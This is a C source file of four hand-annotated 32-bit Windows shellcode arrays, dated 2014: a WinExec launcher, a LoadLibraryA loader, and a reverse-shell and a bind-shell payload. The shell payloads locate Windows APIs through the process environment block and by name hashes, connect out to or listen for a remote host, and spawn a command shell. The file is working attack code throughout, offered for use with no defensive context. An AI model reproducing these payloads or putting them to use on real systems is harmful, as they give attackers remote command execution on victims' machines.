
/* Copyright (c) 2014 Kevin Devine */
/* Size = 71 bytes */

char exec32[] = {
  /* 0000 */  "\x60"                          /*  pushad                             */
  /* 0001 */  "\xEB\x3E"                      /*  jmp 00000041h                      */
  /* 0003 */  "\x6A\x30"                      /*  push 00000030h                     */
  /* 0005 */  "\x59"                          /*  pop ecx                            */
  /* 0006 */  "\x64\x8B\x31"                  /*  mov esi, dword ptr fs:[ecx]        */
  /* 0009 */  "\x8B\x76\x0C"                  /*  mov esi, dword ptr [esi+0Ch]       */
  /* 000C */  "\x8B\x76\x0C"                  /*  mov esi, dword ptr [esi+0Ch]       */
  /* 000F */  "\xAD"                          /*  lodsd                              */
  /* 0010 */  "\x8B\x30"                      /*  mov esi, dword ptr [eax]           */
  /* 0012 */  "\x8B\x6E\x18"                  /*  mov ebp, dword ptr [esi+18h]       */
  /* 0015 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [ebp+3Ch]       */
  /* 0018 */  "\x8B\x44\x28\x78"              /*  mov eax, dword ptr [eax+ebp+78h]   */
  /* 001C */  "\x8D\x74\x28\x1C"              /*  lea esi, dword ptr [eax+ebp+1Ch]   */
  /* 0020 */  "\xB1\x03"                      /*  mov cl, 03h                        */
  /* 0022 */  "\xAD"                          /*  lodsd                              */
  /* 0023 */  "\x03\xC5"                      /*  add eax, ebp                       */
  /* 0025 */  "\x50"                          /*  push eax                           */
  /* 0026 */  "\xE2\xFA"                      /*  loop 00000022h                     */
  /* 0028 */  "\x5F"                          /*  pop edi                            */
  /* 0029 */  "\x5E"                          /*  pop esi                            */
  /* 002A */  "\x5B"                          /*  pop ebx                            */
  /* 002B */  "\x0F\xB7\x14\x4F"              /*  movzx edx, word ptr [edi+ecx*2]    */
  /* 002F */  "\x41"                          /*  inc ecx                            */
  /* 0030 */  "\xAD"                          /*  lodsd                              */
  /* 0031 */  "\x81\x3C\x28\x57\x69\x6E\x45"  /*  cmp dword ptr [eax+ebp], 456E6957h */
  /* 0038 */  "\x75\xF1"                      /*  jne 0000002Bh                      */
  /* 003A */  "\x03\x2C\x93"                  /*  add ebp, dword ptr [ebx+edx*4]     */
  /* 003D */  "\xFF\xD5"                      /*  call ebp                           */
  /* 003F */  "\x61"                          /*  popad                              */
  /* 0040 */  "\xC3"                          /*  ret                                */
  /* 0041 */  "\x50"                          /*  push eax                           */
  /* 0042 */  "\xE8\xBC\xFF\xFF\xFF"          /*  call 00000003h                     */
};

/* Copyright (c) 2014 Kevin Devine */
/* Size = 81 bytes */

char load32[] = {
  /* 0000 */  "\x60"                          /*  pushad                             */
  /* 0001 */  "\xEB\x49"                      /*  jmp 0000004Ch                      */
  /* 0003 */  "\x6A\x30"                      /*  push 00000030h                     */
  /* 0005 */  "\x59"                          /*  pop ecx                            */
  /* 0006 */  "\x64\x8B\x31"                  /*  mov esi, dword ptr fs:[ecx]        */
  /* 0009 */  "\x8B\x76\x0C"                  /*  mov esi, dword ptr [esi+0Ch]       */
  /* 000C */  "\x8B\x76\x0C"                  /*  mov esi, dword ptr [esi+0Ch]       */
  /* 000F */  "\xAD"                          /*  lodsd                              */
  /* 0010 */  "\x8B\x30"                      /*  mov esi, dword ptr [eax]           */
  /* 0012 */  "\x8B\x6E\x18"                  /*  mov ebp, dword ptr [esi+18h]       */
  /* 0015 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [ebp+3Ch]       */
  /* 0018 */  "\x8B\x44\x28\x78"              /*  mov eax, dword ptr [eax+ebp+78h]   */
  /* 001C */  "\x8D\x74\x28\x1C"              /*  lea esi, dword ptr [eax+ebp+1Ch]   */
  /* 0020 */  "\xB1\x03"                      /*  mov cl, 03h                        */
  /* 0022 */  "\xAD"                          /*  lodsd                              */
  /* 0023 */  "\x03\xC5"                      /*  add eax, ebp                       */
  /* 0025 */  "\x50"                          /*  push eax                           */
  /* 0026 */  "\xE2\xFA"                      /*  loop 00000022h                     */
  /* 0028 */  "\x5F"                          /*  pop edi                            */
  /* 0029 */  "\x5E"                          /*  pop esi                            */
  /* 002A */  "\x5B"                          /*  pop ebx                            */
  /* 002B */  "\x0F\xB7\x14\x4F"              /*  movzx edx, word ptr [edi+ecx*2]    */
  /* 002F */  "\x41"                          /*  inc ecx                            */
  /* 0030 */  "\xAD"                          /*  lodsd                              */
  /* 0031 */  "\x81\x3C\x28\x4C\x6F\x61\x64"  /*  cmp dword ptr [eax+ebp], 64616F4Ch */
  /* 0038 */  "\x75\xF1"                      /*  jne 0000002Bh                      */
  /* 003A */  "\x80\x7C\x28\x0B\x41"          /*  cmp byte ptr [eax+ebp+0Bh], 41h    */
  /* 003F */  "\x75\xEA"                      /*  jne 0000002Bh                      */
  /* 0041 */  "\x03\x2C\x93"                  /*  add ebp, dword ptr [ebx+edx*4]     */
  /* 0044 */  "\xFF\xD5"                      /*  call ebp                           */
  /* 0046 */  "\x89\x44\x24\x1C"              /*  mov dword ptr [esp+1Ch], eax       */
  /* 004A */  "\x61"                          /*  popad                              */
  /* 004B */  "\xC3"                          /*  ret                                */
  /* 004C */  "\xE8\xB2\xFF\xFF\xFF"          /*  call 00000003h                     */
};

/* Copyright (c) 2014 Kevin Devine */
/* Size = 224 bytes */


#define REV_OVERLAP32_DATA_OFFSET 0x6B

char rev_overlap32[] = {
  /* 0000 */  "\x60"                  /*  pushad                             */
  /* 0001 */  "\xEB\x63"              /*  jmp 00000066h                      */
  /* 0003 */  "\x5E"                  /*  pop esi                            */
  /* 0004 */  "\x8D\x6E\x1C"          /*  lea ebp, dword ptr [esi+1Ch]       */
  /* 0007 */  "\x33\xC0"              /*  xor eax, eax                       */
  /* 0009 */  "\x99"                  /*  cdq                                */
  /* 000A */  "\xB2\x58"              /*  mov dl, 58h                        */
  /* 000C */  "\x2B\xE2"              /*  sub esp, edx                       */
  /* 000E */  "\x8B\xFC"              /*  mov edi, esp                       */
  /* 0010 */  "\x8B\xCA"              /*  mov ecx, edx                       */
  /* 0012 */  "\xF3\xAA"              /*  rep stosb                          */
  /* 0014 */  "\x6A\x01"              /*  push 00000001h                     */
  /* 0016 */  "\x6A\x02"              /*  push 00000002h                     */
  /* 0018 */  "\xFF\xD5"              /*  call ebp                           */
  /* 001A */  "\x93"                  /*  xchg eax, ebx                      */
  /* 001B */  "\x8B\xFC"              /*  mov edi, esp                       */
  /* 001D */  "\x6A\x10"              /*  push 00000010h                     */
  /* 001F */  "\x57"                  /*  push edi                           */
  /* 0020 */  "\x53"                  /*  push ebx                           */
  /* 0021 */  "\xAD"                  /*  lodsd                              */
  /* 0022 */  "\xF7\xD0"              /*  not eax                            */
  /* 0024 */  "\xAB"                  /*  stosd                              */
  /* 0025 */  "\xAD"                  /*  lodsd                              */
  /* 0026 */  "\xF7\xD0"              /*  not eax                            */
  /* 0028 */  "\xAB"                  /*  stosd                              */
  /* 0029 */  "\xFF\xD5"              /*  call ebp                           */
  /* 002B */  "\x8B\xFC"              /*  mov edi, esp                       */
  /* 002D */  "\x6A\x44"              /*  push 00000044h                     */
  /* 002F */  "\x8F\x07"              /*  pop dword ptr [edi]                */
  /* 0031 */  "\x89\x47\x04"          /*  mov dword ptr [edi+04h], eax       */
  /* 0034 */  "\xFF\x47\x2D"          /*  inc dword ptr [edi+2Dh]            */
  /* 0037 */  "\x93"                  /*  xchg eax, ebx                      */
  /* 0038 */  "\x8D\x7F\x38"          /*  lea edi, dword ptr [edi+38h]       */
  /* 003B */  "\xAB"                  /*  stosd                              */
  /* 003C */  "\xAB"                  /*  stosd                              */
  /* 003D */  "\xAB"                  /*  stosd                              */
  /* 003E */  "\x93"                  /*  xchg eax, ebx                      */
  /* 003F */  "\xB8\x9C\x92\x9B\xFF"  /*  mov eax, FF9B929Ch                 */
  /* 0044 */  "\xF7\xD0"              /*  not eax                            */
  /* 0046 */  "\x99"                  /*  cdq                                */
  /* 0047 */  "\x8B\xCF"              /*  mov ecx, edi                       */
  /* 0049 */  "\xAB"                  /*  stosd                              */
  /* 004A */  "\x8B\xC4"              /*  mov eax, esp                       */
  /* 004C */  "\x50"                  /*  push eax                           */
  /* 004D */  "\x50"                  /*  push eax                           */
  /* 004E */  "\x52"                  /*  push edx                           */
  /* 004F */  "\x52"                  /*  push edx                           */
  /* 0050 */  "\x52"                  /*  push edx                           */
  /* 0051 */  "\x51"                  /*  push ecx                           */
  /* 0052 */  "\x52"                  /*  push edx                           */
  /* 0053 */  "\x52"                  /*  push edx                           */
  /* 0054 */  "\x51"                  /*  push ecx                           */
  /* 0055 */  "\x52"                  /*  push edx                           */
  /* 0056 */  "\xFF\xD5"              /*  call ebp                           */
  /* 0058 */  "\x58"                  /*  pop eax                            */
  /* 0059 */  "\x6A\xFF"              /*  push FFFFFFFFh                     */
  /* 005B */  "\x50"                  /*  push eax                           */
  /* 005C */  "\xFF\xD5"              /*  call ebp                           */
  /* 005E */  "\x53"                  /*  push ebx                           */
  /* 005F */  "\xFF\xD5"              /*  call ebp                           */
  /* 0061 */  "\x83\xC4\x48"          /*  add esp, 48h                       */
  /* 0064 */  "\x61"                  /*  popad                              */
  /* 0065 */  "\xC3"                  /*  ret                                */
  /* 0066 */  "\xE8\x98\xFF\xFF\xFF"  /*  call 00000003h                     */
  /* 006B */  "\xB2\xA5\xC1\x87"
  /* 006F */  "\x00\x00\x00\x00"
  /* 0073 */  "\x00\x00\x00\x00"
  /* 0077 */  "\xEC\x80\x9C\xE4"
  /* 007B */  "\xFE\xDF\x72\x17"
  /* 007F */  "\x4B\xDA\x38\x53"
  /* 0083 */  "\x6E\xED\xCD\xA2"
  /* 0087 */  "\xAD"                  /*  lodsd                              */
  /* 0088 */  "\x60"                  /*  pushad                             */
  /* 0089 */  "\x6A\x30"              /*  push 00000030h                     */
  /* 008B */  "\x5E"                  /*  pop esi                            */
  /* 008C */  "\x64\xAD"              /*  lodsd                              */
  /* 008E */  "\x8B\x40\x0C"          /*  mov eax, dword ptr [eax+0Ch]       */
  /* 0091 */  "\x8B\x70\x1C"          /*  mov esi, dword ptr [eax+1Ch]       */
  /* 0094 */  "\x8B\x6E\x08"          /*  mov ebp, dword ptr [esi+08h]       */
  /* 0097 */  "\xAD"                  /*  lodsd                              */
  /* 0098 */  "\x50"                  /*  push eax                           */
  /* 0099 */  "\x8B\x45\x3C"          /*  mov eax, dword ptr [ebp+3Ch]       */
  /* 009C */  "\x8B\x44\x28\x78"      /*  mov eax, dword ptr [eax+ebp+78h]   */
  /* 00A0 */  "\x8D\x74\x28\x18"      /*  lea esi, dword ptr [eax+ebp+18h]   */
  /* 00A4 */  "\xAD"                  /*  lodsd                              */
  /* 00A5 */  "\x91"                  /*  xchg eax, ecx                      */
  /* 00A6 */  "\xE3\xEC"              /*  jecxz 00000094h                    */
  /* 00A8 */  "\xAD"                  /*  lodsd                              */
  /* 00A9 */  "\x03\xC5"              /*  add eax, ebp                       */
  /* 00AB */  "\x50"                  /*  push eax                           */
  /* 00AC */  "\xAD"                  /*  lodsd                              */
  /* 00AD */  "\x8D\x3C\x28"          /*  lea edi, dword ptr [eax+ebp]       */
  /* 00B0 */  "\xAD"                  /*  lodsd                              */
  /* 00B1 */  "\x8D\x1C\x28"          /*  lea ebx, dword ptr [eax+ebp]       */
  /* 00B4 */  "\x8B\x74\x8F\xFC"      /*  mov esi, dword ptr [edi+ecx*4-04h] */
  /* 00B8 */  "\x03\xF5"              /*  add esi, ebp                       */
  /* 00BA */  "\x33\xC0"              /*  xor eax, eax                       */
  /* 00BC */  "\x99"                  /*  cdq                                */
  /* 00BD */  "\xAC"                  /*  lodsb                              */
  /* 00BE */  "\x03\xD0"              /*  add edx, eax                       */
  /* 00C0 */  "\xC1\xC2\x07"          /*  rol edx, 07h                       */
  /* 00C3 */  "\x33\xD0"              /*  xor edx, eax                       */
  /* 00C5 */  "\x48"                  /*  dec eax                            */
  /* 00C6 */  "\x79\xF5"              /*  jns 000000BDh                      */
  /* 00C8 */  "\x3B\x54\x24\x24"      /*  cmp edx, dword ptr [esp+24h]       */
  /* 00CC */  "\xE0\xE6"              /*  loopne 000000B4h                   */
  /* 00CE */  "\x58"                  /*  pop eax                            */
  /* 00CF */  "\x5E"                  /*  pop esi                            */
  /* 00D0 */  "\x75\xC2"              /*  jne 00000094h                      */
  /* 00D2 */  "\x0F\xB7\x14\x4B"      /*  movzx edx, word ptr [ebx+ecx*2]    */
  /* 00D6 */  "\x03\x2C\x90"          /*  add ebp, dword ptr [eax+edx*4]     */
  /* 00D9 */  "\x89\x6C\x24\x1C"      /*  mov dword ptr [esp+1Ch], ebp       */
  /* 00DD */  "\x61"                  /*  popad                              */
  /* 00DE */  "\xFF\xE0"              /*  jmp eax                            */
};

/* Copyright (c) 2014 Kevin Devine */
/* Size = 240 bytes */


#define BIND_OVERLAP32_DATA_OFFSET 0x77

char bind_overlap32[] = {
  /* 0000 */  "\x60"                  /*  pushad                             */
  /* 0001 */  "\xEB\x6B"              /*  jmp 0000006Eh                      */
  /* 0003 */  "\x5E"                  /*  pop esi                            */
  /* 0004 */  "\x8D\x6E\x24"          /*  lea ebp, dword ptr [esi+24h]       */
  /* 0007 */  "\x33\xC0"              /*  xor eax, eax                       */
  /* 0009 */  "\x99"                  /*  cdq                                */
  /* 000A */  "\xB2\x58"              /*  mov dl, 58h                        */
  /* 000C */  "\x2B\xE2"              /*  sub esp, edx                       */
  /* 000E */  "\x8B\xFC"              /*  mov edi, esp                       */
  /* 0010 */  "\x8B\xCA"              /*  mov ecx, edx                       */
  /* 0012 */  "\xF3\xAA"              /*  rep stosb                          */
  /* 0014 */  "\x6A\x01"              /*  push 00000001h                     */
  /* 0016 */  "\x6A\x02"              /*  push 00000002h                     */
  /* 0018 */  "\xFF\xD5"              /*  call ebp                           */
  /* 001A */  "\x93"                  /*  xchg eax, ebx                      */
  /* 001B */  "\x8B\xFC"              /*  mov edi, esp                       */
  /* 001D */  "\x6A\x10"              /*  push 00000010h                     */
  /* 001F */  "\x57"                  /*  push edi                           */
  /* 0020 */  "\x53"                  /*  push ebx                           */
  /* 0021 */  "\xAD"                  /*  lodsd                              */
  /* 0022 */  "\xF7\xD0"              /*  not eax                            */
  /* 0024 */  "\xAB"                  /*  stosd                              */
  /* 0025 */  "\xAD"                  /*  lodsd                              */
  /* 0026 */  "\xF7\xD0"              /*  not eax                            */
  /* 0028 */  "\xAB"                  /*  stosd                              */
  /* 0029 */  "\xFF\xD5"              /*  call ebp                           */
  /* 002B */  "\x50"                  /*  push eax                           */
  /* 002C */  "\x53"                  /*  push ebx                           */
  /* 002D */  "\xFF\xD5"              /*  call ebp                           */
  /* 002F */  "\x50"                  /*  push eax                           */
  /* 0030 */  "\x50"                  /*  push eax                           */
  /* 0031 */  "\x53"                  /*  push ebx                           */
  /* 0032 */  "\xFF\xD5"              /*  call ebp                           */
  /* 0034 */  "\x8B\xFC"              /*  mov edi, esp                       */
  /* 0036 */  "\x6A\x44"              /*  push 00000044h                     */
  /* 0038 */  "\x8F\x07"              /*  pop dword ptr [edi]                */
  /* 003A */  "\x89\x47\x04"          /*  mov dword ptr [edi+04h], eax       */
  /* 003D */  "\xFF\x47\x2D"          /*  inc dword ptr [edi+2Dh]            */
  /* 0040 */  "\x8D\x7F\x38"          /*  lea edi, dword ptr [edi+38h]       */
  /* 0043 */  "\xAB"                  /*  stosd                              */
  /* 0044 */  "\xAB"                  /*  stosd                              */
  /* 0045 */  "\xAB"                  /*  stosd                              */
  /* 0046 */  "\x93"                  /*  xchg eax, ebx                      */
  /* 0047 */  "\xB8\x9C\x92\x9B\xFF"  /*  mov eax, FF9B929Ch                 */
  /* 004C */  "\xF7\xD0"              /*  not eax                            */
  /* 004E */  "\x99"                  /*  cdq                                */
  /* 004F */  "\x8B\xCF"              /*  mov ecx, edi                       */
  /* 0051 */  "\xAB"                  /*  stosd                              */
  /* 0052 */  "\x8B\xC4"              /*  mov eax, esp                       */
  /* 0054 */  "\x50"                  /*  push eax                           */
  /* 0055 */  "\x50"                  /*  push eax                           */
  /* 0056 */  "\x52"                  /*  push edx                           */
  /* 0057 */  "\x52"                  /*  push edx                           */
  /* 0058 */  "\x52"                  /*  push edx                           */
  /* 0059 */  "\x51"                  /*  push ecx                           */
  /* 005A */  "\x52"                  /*  push edx                           */
  /* 005B */  "\x52"                  /*  push edx                           */
  /* 005C */  "\x51"                  /*  push ecx                           */
  /* 005D */  "\x52"                  /*  push edx                           */
  /* 005E */  "\xFF\xD5"              /*  call ebp                           */
  /* 0060 */  "\x58"                  /*  pop eax                            */
  /* 0061 */  "\x6A\xFF"              /*  push FFFFFFFFh                     */
  /* 0063 */  "\x50"                  /*  push eax                           */
  /* 0064 */  "\xFF\xD5"              /*  call ebp                           */
  /* 0066 */  "\x53"                  /*  push ebx                           */
  /* 0067 */  "\xFF\xD5"              /*  call ebp                           */
  /* 0069 */  "\x83\xC4\x48"          /*  add esp, 48h                       */
  /* 006C */  "\x61"                  /*  popad                              */
  /* 006D */  "\xC3"                  /*  ret                                */
  /* 006E */  "\xE8\x90\xFF\xFF\xFF"  /*  call 00000003h                     */
  /* 0073 */  "\xB2\xA5\xC1\x87"
  /* 0077 */  "\x00\x00\x00\x00"
  /* 007B */  "\x00\x00\x00\x00"
  /* 007F */  "\x1C\xB1\x14\xCB"
  /* 0083 */  "\xEE\xAD\xFD\x8A"
  /* 0087 */  "\x3C\x2C\x96\x9A"
  /* 008B */  "\xFE\xDF\x72\x17"
  /* 008F */  "\x4B\xDA\x38\x53"
  /* 0093 */  "\x6E\xED\xCD\xA2"
  /* 0097 */  "\xAD"                  /*  lodsd                              */
  /* 0098 */  "\x60"                  /*  pushad                             */
  /* 0099 */  "\x6A\x30"              /*  push 00000030h                     */
  /* 009B */  "\x5E"                  /*  pop esi                            */
  /* 009C */  "\x64\xAD"              /*  lodsd                              */
  /* 009E */  "\x8B\x40\x0C"          /*  mov eax, dword ptr [eax+0Ch]       */
  /* 00A1 */  "\x8B\x70\x1C"          /*  mov esi, dword ptr [eax+1Ch]       */
  /* 00A4 */  "\x8B\x6E\x08"          /*  mov ebp, dword ptr [esi+08h]       */
  /* 00A7 */  "\xAD"                  /*  lodsd                              */
  /* 00A8 */  "\x50"                  /*  push eax                           */
  /* 00A9 */  "\x8B\x45\x3C"          /*  mov eax, dword ptr [ebp+3Ch]       */
  /* 00AC */  "\x8B\x44\x28\x78"      /*  mov eax, dword ptr [eax+ebp+78h]   */
  /* 00B0 */  "\x8D\x74\x28\x18"      /*  lea esi, dword ptr [eax+ebp+18h]   */
  /* 00B4 */  "\xAD"                  /*  lodsd                              */
  /* 00B5 */  "\x91"                  /*  xchg eax, ecx                      */
  /* 00B6 */  "\xE3\xEC"              /*  jecxz 000000A4h                    */
  /* 00B8 */  "\xAD"                  /*  lodsd                              */
  /* 00B9 */  "\x03\xC5"              /*  add eax, ebp                       */
  /* 00BB */  "\x50"                  /*  push eax                           */
  /* 00BC */  "\xAD"                  /*  lodsd                              */
  /* 00BD */  "\x8D\x3C\x28"          /*  lea edi, dword ptr [eax+ebp]       */
  /* 00C0 */  "\xAD"                  /*  lodsd                              */
  /* 00C1 */  "\x8D\x1C\x28"          /*  lea ebx, dword ptr [eax+ebp]       */
  /* 00C4 */  "\x8B\x74\x8F\xFC"      /*  mov esi, dword ptr [edi+ecx*4-04h] */
  /* 00C8 */  "\x03\xF5"              /*  add esi, ebp                       */
  /* 00CA */  "\x33\xC0"              /*  xor eax, eax                       */
  /* 00CC */  "\x99"                  /*  cdq                                */
  /* 00CD */  "\xAC"                  /*  lodsb                              */
  /* 00CE */  "\x03\xD0"              /*  add edx, eax                       */
  /* 00D0 */  "\xC1\xC2\x07"          /*  rol edx, 07h                       */
  /* 00D3 */  "\x33\xD0"              /*  xor edx, eax                       */
  /* 00D5 */  "\x48"                  /*  dec eax                            */
  /* 00D6 */  "\x79\xF5"              /*  jns 000000CDh                      */
  /* 00D8 */  "\x3B\x54\x24\x24"      /*  cmp edx, dword ptr [esp+24h]       */
  /* 00DC */  "\xE0\xE6"              /*  loopne 000000C4h                   */
  /* 00DE */  "\x58"                  /*  pop eax                            */
  /* 00DF */  "\x5E"                  /*  pop esi                            */
  /* 00E0 */  "\x75\xC2"              /*  jne 000000A4h                      */
  /* 00E2 */  "\x0F\xB7\x14\x4B"      /*  movzx edx, word ptr [ebx+ecx*2]    */
  /* 00E6 */  "\x03\x2C\x90"          /*  add ebp, dword ptr [eax+edx*4]     */
  /* 00E9 */  "\x89\x6C\x24\x1C"      /*  mov dword ptr [esp+1Ch], ebp       */
  /* 00ED */  "\x61"                  /*  popad                              */
  /* 00EE */  "\xFF\xE0"              /*  jmp eax                            */
};
